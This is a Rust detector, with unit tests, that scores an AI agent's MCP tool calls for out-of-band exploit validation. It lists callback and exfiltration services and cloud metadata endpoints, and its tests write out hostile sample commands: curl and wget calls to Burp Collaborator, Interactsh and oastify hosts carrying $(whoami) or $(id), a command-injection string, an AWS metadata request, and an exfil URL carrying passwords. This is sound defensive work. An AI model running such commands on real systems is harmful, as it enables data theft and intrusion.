/// Callback Validation Detection - GTG-1002 Phase 3 Exploitation Pattern
///
/// Detects out-of-band (OOB) exploit validation where attackers use callback
/// services like Burp Collaborator, Interactsh, etc. to validate exploits.

use crate::AnalyzerResult;
use mcp_protocol::MCPToolCall;
use regex::Regex;

pub struct CallbackValidationAnalyzer {
    callback_services: Vec<&'static str>,
    oob_patterns: Vec<&'static str>,
    url_regex: Regex,
}

impl CallbackValidationAnalyzer {
    pub fn new() -> Self {
        Self {
            callback_services: vec![
                // Commercial/public callback services
                "burpcollaborator.net",
                "oastify.com",
                "interactsh.com",
                "canarytokens.com",
                "dnslog.cn",
                "requestbin.com",
                "webhook.site",
                "pipedream.com",
                "ngrok.io",
                "ngrok.app",
                "serveo.net",
                "localhost.run",
                // Generic patterns
                ".collaborate.",
                ".callback.",
                ".oob.",
                ".exfil.",
            ],
            oob_patterns: vec![
                // SSRF callback patterns
                "http://internal",
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254", // AWS metadata
                "http://metadata.google.internal", // GCP metadata
                "http://169.254.170.2", // ECS metadata
                // DNS exfiltration patterns
                "nslookup",
                "dig @",
                "host ",
                // XXE callback patterns
                "<!entity",
                "system \"http://",
                // Blind injection callbacks
                "sleep(",
                "waitfor delay",
                "pg_sleep(",
                "benchmark(",
            ],
            url_regex: Regex::new(r#"https?://[^\s<>"'\)]+|[a-z0-9-]+\.(burpcollaborator\.net|oastify\.com|interactsh\.com|ngrok\.io)"#).unwrap(),
        }
    }

    pub fn analyze(&self, tool_call: &MCPToolCall) -> AnalyzerResult {
        let content = self.extract_content(tool_call);
        if content.is_empty() {
            return AnalyzerResult {
                analyzer_name: "callback_validation".to_string(),
                threat_score: 0.0,
                patterns: vec![],
                metadata: serde_json::json!({}),
            };
        }

        let content_lower = content.to_lowercase();
        let mut score: f64 = 0.0;
        let mut patterns_found = Vec::new();

        // Extract URLs from content
        let urls = self.extract_urls(&content);

        // Check for callback services
        let mut callback_count = 0;
        for url in &urls {
            let url_lower = url.to_lowercase();
            for service in &self.callback_services {
                if url_lower.contains(service) {
                    patterns_found.push(format!("Callback service detected: {}", service));
                    callback_count += 1;
                    score += 40.0; // High score for callback services
                    break;
                }
            }
        }

        // Check for OOB patterns
        for pattern in &self.oob_patterns {
            if content_lower.contains(pattern) {
                patterns_found.push(format!("OOB exploitation pattern: {}", pattern));
                score += 25.0;
            }
        }

        // Check for SSRF with callback
        if (content_lower.contains("curl") || content_lower.contains("wget") || content_lower.contains("fetch"))
            && callback_count > 0 {
            patterns_found.push("SSRF exploitation with callback validation".to_string());
            score += 30.0;
        }

        // Check for command injection with callback
        if (content_lower.contains("$(") || content_lower.contains("`") || content_lower.contains(";"))
            && (content_lower.contains("curl") || content_lower.contains("wget")) {
            patterns_found.push("Command injection with OOB validation".to_string());
            score += 30.0;
        }

        // Check for suspicious callback parameters
        let suspicious_params = ["exfil", "data", "dump", "steal", "extract", "leak", "password", "secret"];
        for param in &suspicious_params {
            if content_lower.contains(param) && callback_count > 0 {
                patterns_found.push(format!("Suspicious callback parameter: {}", param));
                score += 15.0;
                break;
            }
        }

        // Check for AWS metadata SSRF
        if content_lower.contains("169.254.169.254") {
            patterns_found.push("AWS metadata SSRF attempt detected".to_string());
            score += 50.0; // Very high score for metadata endpoint
        }

        // Check for GCP metadata SSRF
        if content_lower.contains("metadata.google.internal") {
            patterns_found.push("GCP metadata SSRF attempt detected".to_string());
            score += 50.0;
        }

        let metadata = serde_json::json!({
            "callback_count": callback_count,
            "url_count": urls.len(),
            "pattern_count": patterns_found.len(),
        });

        AnalyzerResult {
            analyzer_name: "callback_validation".to_string(),
            threat_score: score.min(100.0),
            patterns: patterns_found,
            metadata,
        }
    }

    fn extract_content(&self, tool_call: &MCPToolCall) -> String {
        match tool_call {
            MCPToolCall::Bash { command, args, .. } => {
                let mut content = command.clone();
                if !args.is_empty() {
                    content.push(' ');
                    content.push_str(&args.join(" "));
                }
                content
            }
            MCPToolCall::Filesystem { path, .. } => path.clone(),
            MCPToolCall::Network { url, .. } => url.clone(),
            MCPToolCall::Database { query, .. } => query.clone(),
            MCPToolCall::Unknown { params, .. } => {
                serde_json::to_string(params).unwrap_or_default()
            }
        }
    }

    fn extract_urls(&self, text: &str) -> Vec<String> {
        self.url_regex.find_iter(text)
            .map(|m| m.as_str().to_string())
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_burp_collaborator_detection() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Bash {
            command: "curl".to_string(),
            args: vec!["http://xyz123.burpcollaborator.net".to_string()],
            env: HashMap::new(),
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score >= 60.0, "Should detect Burp Collaborator, got {}", result.threat_score);
        assert!(result.patterns.iter().any(|p| p.contains("Callback service")));
        assert!(result.patterns.iter().any(|p| p.contains("SSRF")));
    }

    #[test]
    fn test_interactsh_detection() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Bash {
            command: "wget".to_string(),
            args: vec!["http://test.interactsh.com/$(whoami)".to_string()],
            env: HashMap::new(),
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score >= 60.0);
        assert!(result.patterns.iter().any(|p| p.contains("interactsh")));
    }

    #[test]
    fn test_aws_metadata_ssrf() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Bash {
            command: "curl".to_string(),
            args: vec!["http://169.254.169.254/latest/meta-data/".to_string()],
            env: HashMap::new(),
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score >= 70.0, "AWS metadata SSRF should score high");
        assert!(result.patterns.iter().any(|p| p.contains("AWS metadata")));
    }

    #[test]
    fn test_ngrok_callback() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Network {
            method: "POST".to_string(),
            url: "https://abc123.ngrok.io/callback".to_string(),
            headers: HashMap::new(),
            body: Some(vec![]),
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score >= 40.0);
        assert!(result.patterns.iter().any(|p| p.contains("ngrok")));
    }

    #[test]
    fn test_command_injection_with_callback() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Bash {
            command: "echo".to_string(),
            args: vec!["test; curl http://test.oastify.com/$(id)".to_string()],
            env: HashMap::new(),
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score >= 60.0);
        assert!(result.patterns.iter().any(|p| p.contains("Command injection")));
    }

    #[test]
    fn test_no_false_positives() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Network {
            method: "GET".to_string(),
            url: "https://api.github.com/repos/user/project".to_string(),
            headers: HashMap::new(),
            body: None,
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score < 20.0, "Should not flag normal API requests");
        assert!(result.patterns.is_empty());
    }

    #[test]
    fn test_exfiltration_parameter() {
        let analyzer = CallbackValidationAnalyzer::new();

        let tool_call = MCPToolCall::Bash {
            command: "curl".to_string(),
            args: vec!["http://test.burpcollaborator.net/exfil?data=passwords".to_string()],
            env: HashMap::new(),
        };

        let result = analyzer.analyze(&tool_call);

        assert!(result.threat_score >= 80.0, "Exfil parameter should score very high");
        assert!(result.patterns.iter().any(|p| p.contains("Suspicious callback parameter")));
    }
}
